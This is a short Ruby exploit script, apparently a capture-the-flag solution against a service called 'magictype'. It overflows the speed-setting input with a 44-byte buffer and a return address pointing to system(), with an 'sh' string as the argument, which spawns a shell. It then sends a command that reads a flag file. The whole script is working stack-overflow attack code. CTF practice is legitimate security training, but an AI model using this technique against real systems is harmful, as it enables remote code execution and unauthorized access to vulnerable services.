require 'socket'
require './ipconfig.rb'

# need to fill in basic info in ipconfig.rb
hostname = HOSTNAME
port = PORT

# where you want to jump after doing leaking
# jump to the system call -> system(...)
return_addr = "\xf0\x86\x04\x08"

# the system call argument address!
# I want to use "sh" as the system call argument
# the "sh" is at the .data section
# since it's stored in the global string value(char sh[3])
argument_addr = "\xa0\xb0\x04\x08"

# follwing is the buffer to do leaking
# fill total 44 char
buf = ''
44.times { buf << 'a' }
# fill the return address
buf << return_addr
# fill the argument address,
# 'aaaa' is to fill the space between the return_addr and argument_addr
buf << 'aaaa'
buf << argument_addr
buf << "\r\n"

# after run up the system("sh")
# send the following command to get flag!
command = "cat /home/magictype/flag3\n"

puts buf
puts command

s = TCPSocket.open(hostname, port)

# Read lines by lines from the socket
while line = s.gets
  print line

  # send choice '1' to start game
  (line.chop.eql? '3.Exit') && s.send("1\r\n", 0)

  # send speed setting, leak here to get shell!
  # after get the shell, send the command we want
  # you can use this to get all flag!
  if line.chop.eql? 'Choose the speed level(1-9):'
    s.send(buf, 0)
    s.send(command, 0)
  end
end
s.close
